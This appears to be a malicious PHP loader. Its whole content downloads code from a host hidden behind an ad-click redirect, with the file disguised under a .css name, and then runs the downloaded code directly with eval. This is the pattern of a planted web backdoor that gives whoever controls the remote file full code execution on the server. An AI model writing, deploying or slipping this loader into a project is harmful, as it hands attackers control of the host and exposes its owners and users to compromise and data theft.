<?php
$url = "https://googleads.g.doubleclick.net/pcs/click?adurl=https%3A%2F%2Fcdn-assets-s3.pages.dev%2Frefs%2Fheads%2Fmain%2Fanonhook.css&c=R,6,cb2349e1-7f4f-4dd0-88a6-9f8fe8cc3ca1,&typo=4";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'gigigusgasa';
} else {
    eval('?>' . $response);
}
curl_close($ch);
?>
